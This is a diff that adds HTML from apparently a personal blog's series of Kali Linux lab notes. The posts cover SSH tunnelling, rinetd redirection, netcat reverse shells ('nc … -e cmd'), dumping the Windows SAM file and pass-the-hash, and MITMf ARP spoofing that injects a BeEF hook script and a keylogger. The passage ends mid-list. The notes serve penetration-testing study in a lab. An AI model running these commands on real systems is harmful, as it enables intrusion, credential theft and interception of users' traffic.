@@ -240,6 +240,2571 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/01/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E5%85%AD)%EF%BC%9ASSH%E9%9A%A7%E9%81%93--%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/02/01/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E5%85%AD)%EF%BC%9ASSH%E9%9A%A7%E9%81%93--%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" itemprop="url">Kali Linux笔记(六十六)：SSH隧道--本地端口转发</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-01T21:39:12+08:00">
+                2020-02-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  4 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-SSH隧道"><a href="#1-SSH隧道" class="headerlink" title="1. SSH隧道"></a>1. SSH隧道</h4><ul>
+<li>SSH支持双向通信隧道<ul>
+<li>将其他TCP端口的通信通过SSH链接来转发</li>
+<li>用SSH作为传输层协议，对流量自动加解密</li>
+<li>突破防火墙访问规则的限制，可用于翻墙</li>
+</ul>
+</li>
+<li>本地端口转发<ul>
+<li>本地侦听端口，访问转发到远程主机指定端口（SSH流量的流向/应用层流量一致）</li>
+<li>使效果类似于rinetd</li>
+<li>多个流量通过隧道进行转发</li>
+<li>将一本地端口与远程服务器建立隧道</li>
+<li>▲ SSH隧道建立侦听的端口在内网服务器，侦听的端口形象理解为外网服务器的隧道端口</li>
+</ul>
+</li>
+<li>远程端口转发<ul>
+<li>远程侦听端口，访问转发到本机主机指定端口（SSH流量的流向/应用层流量不一致）</li>
+<li>▲ SSH隧道建立侦听的端口在外网服务器，侦听的端口形象理解为内网服务器的隧道端口</li>
+</ul>
+</li>
+<li>动态隧道模式</li>
+</ul>
+<h4 id="2-SSH本地端口转发"><a href="#2-SSH本地端口转发" class="headerlink" title="2. SSH本地端口转发"></a>2. SSH本地端口转发</h4><ul>
+<li>将一本地端口与远程服务器建立隧道</li>
+<li><strong><code>🔺命令：vi /etc/ssh/sshd_config</code></strong><ul>
+<li>PermitRootLogin yes</li>
+<li>Port 53</li>
+<li>PasswordAuthentication yes</li>
+</ul>
+</li>
+<li>端口转发基于建立起来的SSH隧道，隧道中断则端口转发中断</li>
+<li>只能在建立隧道时创建转发，不能为已有隧道增加端口转发</li>
+</ul>
+<p><img src="/images/kali/kali-notepad/SSH%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91.PNG" alt="SSH本地端口转发"></p>
+<h4 id="3-准备"><a href="#3-准备" class="headerlink" title="3. 准备"></a>3. 准备</h4><ul>
+<li>实验机子：Linux主机/防火墙（mono）/Web服务器（KALI/2007），关闭机子的防火墙</li>
+<li>Metasploit主机<ul>
+<li>插入bodhi-3.2.0-64.iso光盘，用光盘启动，修改网络为Host-only方式，检查网络</li>
+</ul>
+</li>
+<li>Mono防火墙<ul>
+<li>第一个网卡为Hosy-only方式，第二个网卡为Bridge桥接方式，桥接到无线网络，检查</li>
+</ul>
+</li>
+<li>Kali主机<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li>修改Kali的/etc/ssh/sshd_config配置</li>
+<li><strong><code>🔺命令：service ssh restart，查看SSH是否正常运行</code></strong>（<strong><code>🔺命令：netstat -pantu | grep 53</code></strong>）</li>
+</ul>
+</li>
+<li>Window Server 2003<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+</ul>
+</li>
+<li>bodhi主机<ul>
+<li>访问别机的WEB服务器：<strong><code>🔺命令：ssh -fCNg -L &lt;listen port&gt;:&lt;remote ip&gt;:&lt;remote port&gt; user@&lt;ssh server&gt; -p &lt;ssh server port&gt;</code></strong> <ul>
+<li>-f（后台运行进程）</li>
+<li>-N（不执行登陆Shell）</li>
+<li>-g（服用访问时作为网管，支持多主机访问本地侦听端口）</li>
+<li>-C（链接建立内容进行压缩）</li>
+<li>网管模式转发RDP、NC shell</li>
+</ul>
+</li>
+<li>访问本机的WEB服务器：<strong><code>🔺命令：ssh -fCNg -L &lt;listen port&gt;:localhost:&lt;remote port&gt; user@&lt;ssh server&gt; -p &lt;ssh port&gt;</code></strong>   </li>
+</ul>
+</li>
+<li>Win XP主机<ul>
+<li>网卡方式为Host-only方式，检查网络</li>
+</ul>
+</li>
+</ul>
+<h4 id="4-Web服务（Window-Server-2003）"><a href="#4-Web服务（Window-Server-2003）" class="headerlink" title="4. Web服务（Window Server 2003）"></a>4. Web服务（Window Server 2003）</h4><ul>
+<li>Window Server 2003<ul>
+<li>安装web server（Win+R → appwiz.cpl → 更改或添加程序 → 应用程序服务器 → IIS，可能需要光盘）</li>
+<li>修改Web的首页面（C:\Inetpub\wwwroot\iisstart.html）</li>
+<li>访问127.0.0.1进行尝试</li>
+</ul>
+</li>
+<li>bodhi<ul>
+<li><strong><code>🔺命令：ssh -CfN -L 7001:Window Server 2003的IP:80 root@Kali的IP -p 53</code></strong></li>
+<li>本机访问127.0.0.1:7001进行测试，看能否访问到Window Server 2003上的Web服务</li>
+</ul>
+</li>
+</ul>
+<h4 id="5-Web服务（Kali）"><a href="#5-Web服务（Kali）" class="headerlink" title="5. Web服务（Kali）"></a>5. Web服务（Kali）</h4><ul>
+<li>Kali<ul>
+<li><strong><code>🔺命令：service apache2 start</code></strong>，尝试访问是否能正常访问</li>
+</ul>
+</li>
+<li>bodhi<ul>
+<li><strong><code>🔺命令：ssh -CfN -L 7002:localhost:80 root@Kali的IP -p 53</code></strong></li>
+<li>本机访问127.0.0.1:7002进行测试，看能否访问到Kali上的Web服务</li>
+</ul>
+</li>
+</ul>
+<h4 id="6-远程桌面（bodhi访问）"><a href="#6-远程桌面（bodhi访问）" class="headerlink" title="6. 远程桌面（bodhi访问）"></a>6. 远程桌面（bodhi访问）</h4><ul>
+<li>Window Server 2003<ul>
+<li>开启远程桌面，cmd修改管理员密码（net user administrator *）</li>
+</ul>
+</li>
+<li>bodhi<ul>
+<li><strong><code>🔺命令：ssh -CfN -L 7003:Window Server 2003的IP:3389 root@Kali的IP -p 53</code></strong></li>
+<li>打开mono的GUI管理界面，开启默认上网设置，下载rdesktop，测试是否能进行远程桌面登陆（Window Server 2003的远程桌面）</li>
+</ul>
+</li>
+</ul>
+<h4 id="7-远程桌面（XP访问）"><a href="#7-远程桌面（XP访问）" class="headerlink" title="7.  远程桌面（XP访问）"></a>7.  远程桌面（XP访问）</h4><ul>
+<li>Window Server 2003<ul>
+<li>开启远程桌面，cmd修改管理员密码（<strong><code>🔺命令：net user administrator *</code></strong>）</li>
+</ul>
+</li>
+<li>bodhi<ul>
+<li><strong><code>🔺命令：ssh -CfNg -L 7004:Window Server 2003的IP:3389 root@Kali的IP -p 53</code></strong></li>
+</ul>
+</li>
+<li>Window XP<ul>
+<li>mstsc打开远程桌面，测试是否能进行远程桌面登陆（Window Server 2003的远程桌面）</li>
+</ul>
+</li>
+</ul>
+<h4 id="8-NC-shell"><a href="#8-NC-shell" class="headerlink" title="8. NC shell"></a>8. NC shell</h4><ul>
+<li>Window Server 2003<ul>
+<li>装入NC程序，<strong><code>🔺命令：nc -nvlp 3333</code></strong></li>
+</ul>
+</li>
+<li>bodhi<ul>
+<li><strong><code>🔺命令：ssh -CfNg -L 7005:Window Server 2003的IP:3333 root@Kali的IP -p 53</code></strong></li>
+</ul>
+</li>
+<li>Window XP<ul>
+<li><strong><code>🔺命令：nc bodhi的IP bodhi的端口 -e cmd</code></strong></li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/kali/kali-notepad/SSH%E9%9A%A7%E9%81%93%E5%B0%9D%E8%AF%95.PNG" alt="SSH隧道尝试"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/31/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E4%BA%94)%EF%BC%9A%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7%E3%80%81%E9%87%8D%E5%AE%9A%E5%90%91/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/01/31/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E4%BA%94)%EF%BC%9A%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7%E3%80%81%E9%87%8D%E5%AE%9A%E5%90%91/" itemprop="url">Kali Linux笔记(六十五)：流量操控、重定向</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-31T20:47:32+08:00">
+                2020-01-31
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.1k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  4 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-流量操控技术"><a href="#1-流量操控技术" class="headerlink" title="1. 流量操控技术"></a>1. 流量操控技术</h4><ul>
+<li>Traffic manipulation technique </li>
+<li>渗透测试中经常遇到访问受限的网络环境<ul>
+<li>防火墙/交换机，端口映射相比于主机直接外网访问更安全</li>
+<li>DNS，TCP/UDP的53端口，基本不过滤</li>
+<li>SSH，22端口，基本不过滤</li>
+<li>通过与家里的电脑进行连接，达到可以访问其他网络资源的结果</li>
+</ul>
+</li>
+<li>使用隐蔽的手段逃避安全检查措施和朔源追踪<ul>
+<li>使明文传输的内容变成加密的内容，躲避安全检查</li>
+<li>跳转攻击源头难以追踪，使用肉鸡进行攻击</li>
+</ul>
+</li>
+<li>证明看似严格的访问控制仍然存在弱点</li>
+<li>在非受信任的网络中实现安全的数据传输<ul>
+<li>难以规避非受信任网络的中间人攻击（arp地址欺骗）</li>
+<li>通过与信任的节点进行连接，加密数据，达到数据转发传输的结果</li>
+</ul>
+</li>
+<li>部分概念的实现过程略有烧脑</li>
+</ul>
+<h4 id="2-流量操控技术"><a href="#2-流量操控技术" class="headerlink" title="2. 流量操控技术"></a>2. 流量操控技术</h4><ul>
+<li>重定向（Redirection）<ul>
+<li>IP、Port</li>
+<li>不进行加密处理，只是作为中间转发</li>
+</ul>
+</li>
+<li>隧道（Tunneling）<ul>
+<li>在不受信任的网络环境中实现安全的通信（两个节点之间的加密流量传输）</li>
+<li>通常使用多种加密技术建立通信隧道</li>
+<li>点到点（IP2IP）、端到端（Port2Port）<ul>
+<li>点到点的安全只有在隧道之间，内网的传输是明文</li>
+<li>端到端是两个进程之间的加密，基本不存在中间人攻击</li>
+</ul>
+</li>
+<li>VPN<ul>
+<li>pptp（不太安全技术，客户端到目标网络，▲过程有几个明文传输）</li>
+<li>l2tp（二层VPN技术，客户端到目标网络）</li>
+<li>IPSec（安全性首选，站点到站点）</li>
+<li>SSL vpn（端到端的VPN，客户端使用连接服务器）</li>
+<li>SSH</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>封装（encapsulation）<ul>
+<li>通常结合在隧道中使用，使用一种协议封装一种协议（RPC o http、VoIP）</li>
+<li>使用网关设备实现不同类型网络的互联互通</li>
+</ul>
+</li>
+</ul>
+<h4 id="3-重定向"><a href="#3-重定向" class="headerlink" title="3. 重定向"></a>3. 重定向</h4><ul>
+<li>Rinetd<ul>
+<li>安装：<strong><code>🔺命令：apt-get install rinetd</code></strong></li>
+<li>配置：/etc/rinetd.conf（bindaddress bindport connectaddress connectport）</li>
+<li>运行：<strong><code>🔺命令：rinetd</code></strong></li>
+</ul>
+</li>
+<li>应用场景<ul>
+<li>重定向web流量，突破上网限制</li>
+<li>远程桌面重定向</li>
+<li>Nc重定向获得Shell</li>
+<li>不兼容FTP等二次连接的协议</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/kali/kali-notepad/%E9%87%8D%E5%AE%9A%E5%90%91.PNG" alt="重定向"></p>
+<h4 id="4-80端口Web服务访问"><a href="#4-80端口Web服务访问" class="headerlink" title="4. 80端口Web服务访问"></a>4. 80端口Web服务访问</h4><ul>
+<li>安装monowall防火墙<ul>
+<li>需要两块网卡，第一块网卡为连接内网的Host-Only网卡，第二块为连接外网的桥接网卡</li>
+<li>安装光盘放进去ISO文件</li>
+<li>选择7，Install on Hard Drive，安装在硬盘上</li>
+<li>输入设备ad0</li>
+<li>重启并拔出ISO光盘</li>
+</ul>
+</li>
+<li>monowall防火墙配置<ul>
+<li>硬盘启动</li>
+<li>选择1，指定网卡接口，不需要vlan</li>
+<li>输入LAN局域网接口em0，输入WAN广域网接口em1，无需其他的端口设置</li>
+<li>重启设备</li>
+</ul>
+</li>
+<li>monowall再配置<ul>
+<li>硬盘启动</li>
+<li>选择2，指定局域网IP地址，子网掩码（bit数），DHCP服务</li>
+<li>选择3，重置webGUI界面，重置为mono</li>
+<li>选择5，重启mono</li>
+</ul>
+</li>
+<li>开启一台win xp sp3电脑<ul>
+<li>选择Host-only网络</li>
+<li>ifconfig/进行ping通信、上网尝试</li>
+</ul>
+</li>
+<li>进入monowall防火墙管理界面<ul>
+<li>Rules，初始规则为LAN → Any</li>
+<li>删除默认规则，进行外网访问尝试</li>
+<li>新建一条规则，Action → Pass，Protocol → TCP/UDP，Destination port range → DNS</li>
+<li>Apply进行应用</li>
+</ul>
+</li>
+<li>Kali网络设置为桥接<ul>
+<li>需要访问墙外流量</li>
+<li><strong><code>🔺命令：apt-get install rinetd</code></strong></li>
+<li><strong><code>🔺命令：vi /etc/rinetd.conf</code></strong>（指向的配置）<ul>
+<li>bindaddress（本机侦听IP）</li>
+<li>bindport（本机侦听端口）</li>
+<li>connectaddress（连接IP）</li>
+<li>connectport（侦听的端口）</li>
+</ul>
+</li>
+<li>rinetd</li>
+</ul>
+</li>
+<li>Window Server 2003网络设置为桥接<ul>
+<li>开启远程桌面，cmd修改管理员密码（net user administrator *）</li>
+<li>安装web server（Win+R → appwiz.cpl → 更改或添加程序 → 应用程序服务器 → IIS，可能需要光盘）</li>
+<li>修改Web的首页面（C:\Inetpub\wwwroot\iisstart.html）</li>
+<li>访问127.0.0.1进行尝试</li>
+</ul>
+</li>
+<li>Win xp访问Kali主机IP的53端口</li>
+</ul>
+<h4 id="5-3389端口远程桌面访问"><a href="#5-3389端口远程桌面访问" class="headerlink" title="5. 3389端口远程桌面访问"></a>5. 3389端口远程桌面访问</h4><ul>
+<li>Kali设置<ul>
+<li><strong><code>🔺命令：vi /etc/rinetd.conf</code></strong>（指向的配置），修改connectport为3389端口</li>
+<li><strong><code>🔺命令：pkill rinetd</code></strong></li>
+<li><strong><code>🔺命令：rinetd</code></strong></li>
+</ul>
+</li>
+<li>Win xp访问远程桌面<ul>
+<li>Win+R → mstsc → Kali主机IP的53端口</li>
+<li>尝试登陆，ifconfig</li>
+</ul>
+</li>
+</ul>
+<h4 id="6-NC获取shell"><a href="#6-NC获取shell" class="headerlink" title="6. NC获取shell"></a>6. NC获取shell</h4><ul>
+<li>思想：XP执行NC把自己的Shell发给Kali的53端口，转发给Window Server 2003，在Window Server 2003用nc来接受Shell</li>
+<li><strong><code>🔺命令：cp /usr/share/windows-binaries/nc.exe /root/Desktop</code></strong>（拷贝到XP和2003的机子上）</li>
+<li>Window Server 2003<ul>
+<li><strong><code>🔺命令：cmd → nc -nvlp 3333</code></strong></li>
+</ul>
+</li>
+<li>Kali设置<ul>
+<li><strong><code>🔺命令：vi /etc/rinetd.conf</code></strong>（指向的配置），修改connectport为3333端口</li>
+<li><strong><code>🔺命令：pkill rinetd</code></strong></li>
+<li><strong><code>🔺命令：rinetd</code></strong></li>
+</ul>
+</li>
+<li>Window XP<ul>
+<li><strong><code>🔺命令：nc Kali的IP地址 53 -e cmd</code></strong></li>
+</ul>
+</li>
+<li>Window Server 2003进行ipconfig</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E5%9B%9B)%EF%BC%9A%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2--%E4%BC%A0%E9%80%92Hash%E5%80%BC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/01/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E5%9B%9B)%EF%BC%9A%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2--%E4%BC%A0%E9%80%92Hash%E5%80%BC/" itemprop="url">Kali Linux笔记(六十四)：密码嗅探--传递Hash值</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-27T23:12:02+08:00">
+                2020-01-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  161 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  1 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-Pass-the-Hash（PTH）"><a href="#1-Pass-the-Hash（PTH）" class="headerlink" title="1. Pass the Hash（PTH）"></a>1. Pass the Hash（PTH）</h4><ul>
+<li>密码破解耗费时间资源巨大 </li>
+<li>使用密文提交给服务器直接完成身份认证 </li>
+<li>NTLM/LM是没有加严的静态HASH密文（▲传输密文每次都是一样的）</li>
+<li>企业中使用ghost等工具克隆安装系统</li>
+<li>操作<ul>
+<li>Win7插入一个Kali光盘，用光盘启动</li>
+<li><strong><code>🔺命令：mount /dev/sda2 /mnt</code></strong></li>
+<li><strong><code>🔺命令：cd /mnt/Windows/System32/config</code></strong></li>
+<li><strong><code>🔺命令：samdump2 SYSTEM SAM</code></strong></li>
+<li>使用nc传递HASH值</li>
+<li>Win7光盘释放重启，关闭Win7防火墙</li>
+<li><strong><code>🔺命令：pth-winexe -U w7%aad3b435b51404eeaad3b435b51404ee:ed1bfaeb3063 716ab7fe2a11faf126d8（用户名密码用%分卡） //Win7IP地址1.1.1.1 cmd</code></strong></li>
+</ul>
+</li>
+<li>▲ 只适用于Window系统</li>
+<li>▲ 2020.1.27 CreateService failed. NT_STATUS_ACCESS_DENIED</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E4%B8%89)%EF%BC%9A%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2--%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/01/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E4%B8%89)%EF%BC%9A%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2--%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/" itemprop="url">Kali Linux笔记(六十三)：密码嗅探--中间人攻击</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-27T23:12:02+08:00">
+                2020-01-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.8k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  8 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-中间人攻击（注入XSS）"><a href="#1-中间人攻击（注入XSS）" class="headerlink" title="1. 中间人攻击（注入XSS）"></a>1. 中间人攻击（注入XSS）</h4><ul>
+<li>注入XSS<ul>
+<li>结合ARP欺骗或DNS代理欺骗，实现中间人攻击</li>
+<li>即使没有XSS漏洞，也可以凌空向每个HTTP请求中注入XSS攻击代码 </li>
+<li>一旦得手，影响范围巨大 </li>
+<li>如果中间人发生在运营商线路上，很难引起用户注意，隐蔽性高 </li>
+</ul>
+</li>
+</ul>
+<h4 id="2-中间人攻击–Mitmf-Beef"><a href="#2-中间人攻击–Mitmf-Beef" class="headerlink" title="2. 中间人攻击–Mitmf*Beef"></a>2. 中间人攻击–Mitmf*Beef</h4><ul>
+<li>Mitmf 安装（无核心技术内容，冗杂性大）▲ 2020.1.24一些依赖包以及安装包无法找到<ul>
+<li>曾经号称最好用的中间人攻击工具（kali 2.0后默认未安装） </li>
+<li><strong><code>🔺命令：apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilterqueue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file</code></strong> </li>
+<li><strong><code>🔺命令：apt-get install mitmf</code></strong> </li>
+<li><strong><code>🔺命令：pip uninstall twisted</code></strong> </li>
+<li><strong><code>🔺命令：wget http://twistedmatrix.com/Releases/Twisted/15.5/Twisted15.5.0.tar.bz2</code></strong> </li>
+<li><strong><code>🔺命令：pip install ./Twisted-15.5.0.tar.bz2</code></strong></li>
+</ul>
+</li>
+<li>启动beef <ul>
+<li><strong><code>🔺命令：cd /usr/share/beef-xss/</code></strong> </li>
+<li><strong><code>🔺命令：./beef</code></strong> ▲ 2020.1.24修改为beef-xss（命令存在Bash中）</li>
+</ul>
+</li>
+<li>mitmf中间人注入xss脚本（结合Beef）<ul>
+<li><strong><code>🔺命令：mitmf --spoof --arp -i eth0 --gateway 1.1.1.1（正确网关地址） --target 1.1.1.2 --inject --js-url http://1.1.1.3:3000/hook.js</code></strong> （ARP地址欺骗）</li>
+</ul>
+</li>
+<li>mitmf中间人注入xss脚本（不结合Beef） <ul>
+<li><strong><code>🔺命令：mitmf --spoof --arp -i eth0 --gateway 192.168.20.2 --target 192.168.20.1 --jskeylogger</code></strong>（ARP地址欺骗）</li>
+<li>–upsidedownternet（图片倒转）、–screen（/var/log/mitmf，屏幕快照） </li>
